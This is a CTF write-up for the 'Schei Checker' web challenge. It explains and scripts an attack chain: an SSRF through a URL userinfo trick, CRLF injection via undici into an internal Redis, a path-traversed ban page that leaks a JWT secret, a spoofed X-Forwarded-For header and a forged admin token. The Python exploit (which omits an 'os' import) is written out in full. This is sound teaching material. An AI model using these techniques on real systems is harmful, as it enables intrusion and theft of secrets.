# TeamItaly CTF 2022

## Schei Checker (6 solves)

The challenge is a webapp which lets you display updated [Italian Lira ERC20 Token](https://italianlira.ws/) prices.

Source code is available for download, and necessary to solve the challenge.

Flag is in the admin control panel.

### Solution

Looking at the network requests to pull the prices, we can see that it includes the path of the price endpoint to be proxied by the backend. This feature can be turned into SSRF: the backend chaines the Lira API to the user-provided endpoint but without postpending `/` to the URL, so the HTTP basic authentication trick is doable: putting `@otherhost` after the hostname will connect to `otherhost` instead of the Italian Lira API, and pass the Italian Lira API hostname as the Authentication header.

Analyzing the source code, we can see that there is an banning mechanism to prevent bruteforce of the admin password, whenever a client does many login attempts in a short period of time, the client IP will be registered into Redis as a banned user, and when a request to the login endpoint will be made by a banned user, the ban page will be served. The ban page is set to `html/tooManyAttempts.html`, but it's joined with data from the database, so with access to the database (Redis), we could override the banpage and load any file from the project’s work directory. Also, the right `X-Forwarded-For` header is not set by the server, so for every legitimate user this mechanism will never actually work (the serialization utility refuses empty strings), but the header can be freely spoofed.

The backend is using version 5.0.0 of the request libary `undici`, which is [vulnerable to a line injection vulnerability in the path](https://github.com/nodejs/undici/security/advisories/GHSA-3cvr-822r-rqcc).

We can access the admin page, but username and password are required. The username is known to be from the source code "admin", but the password is unknown, so it is inaccessible by a normal user. It is built with JWTs.

Chaining all of this, we can craft a malicious URL which will connect to the Redis database, and exploit the line feed injection in the path to send custom commands to Redis, registering an IP with a ban JSON object, with attempts set to a high number and the ban page changed to the configuration file of the backend server. We can send it to the server using the prices proxy endpoint.

We can then make a request to the homepage spoofing the IP to the custom one, and we will receive the ban page, which is actually the server configuration file, with our JWT key. We can use it to forge a JWT key with the username of the admin, and accessing the admin panel with it, we will receive the flag.

To prevent similiar attacks Redis drops the connection when it receives `Host:` or `POST` commands, but the attack is still possible with a CRLF injection in the query string/path of a GET request.

### Exploit

Requires PyJWT, secrets, and requests.

```python
import re
import jwt
import sys
import json
import secrets
import hashlib
import requests

from urllib.parse import quote

# Retrieve flag from the remote service
challenge_url = os.environ.get(
    "URL", "http://schei-checker.challs.teamitaly.eu:15001")
redis_url = 'schei-redis:6379'

# Generate a random IP (doesn't need to be a valid one)
random_ip = secrets.token_hex(12)
random_ip_hash  = hashlib.sha256(random_ip.encode()).hexdigest()
print("[*] Random IP: %s" % random_ip)
print("[*] Random IP hash: %s" % random_ip_hash)

# Create a JSON string with the IP registered as banned,
# and the ban page changed to the server config file
json = '"' + json.dumps({
    "ip": random_ip,
    "banPage": "../config.js",
    "attempts": 40
}).replace('"', '\\"') + '"'

# Use the HTTP Authentication trick to connect to Redis instead of the challenge server,
# and use the query string line feed injection to register the JSON payload into redis
redis_attack = "set auth#%s %s\n" % (random_ip_hash, json)
url_attack = (
    "@" + redis_url + "/?"+
    "\n" +
    redis_attack +
    "\n"
)
url = challenge_url+'/pricesAPI/getPrice?url=' + quote(url_attack)
print("[*] Attack URL: %s" % url_attack)
print("[*] Final URL: %s" % url)
print("[*] Redis attack: %s" % redis_attack)


response = requests.get(url).text
print("[*] Response: %s" % response)

# Make a login request to retrieve the ban page (which is now the config file)
config = requests.post(challenge_url+'/adminAPI/login?', json={
    "username": "admin",
    "password": random_ip_hash[:10]
}, headers={'X-Forwarded-For': random_ip}).text
print("[*] Configuration file:\n    %s" % config.replace("\r\n", "\n").replace("\n", "\n    "))

# Parse the JWT secret from the configuration file
jwt_secret = re.search(r'jwtSecret[ ]*=[ ]*[\`\"\'](.*)[\`\"\']', config)
jwt_secret = jwt_secret.group(1)
print("[*] JWT secret: %s" % jwt_secret)

# Craft admin JWT token
admin_token = jwt.encode({'username': 'admin'}, jwt_secret, algorithm='HS256')
print("[*] Admin JWT token: %s" % admin_token)

# Request the flag from the admin panel
flag = requests.get(challenge_url+'/adminAPI/getCTFFlag', headers={'Authorization': 'Bearer ' + admin_token}).json()
print("[*] Flag: %s" % flag)

```
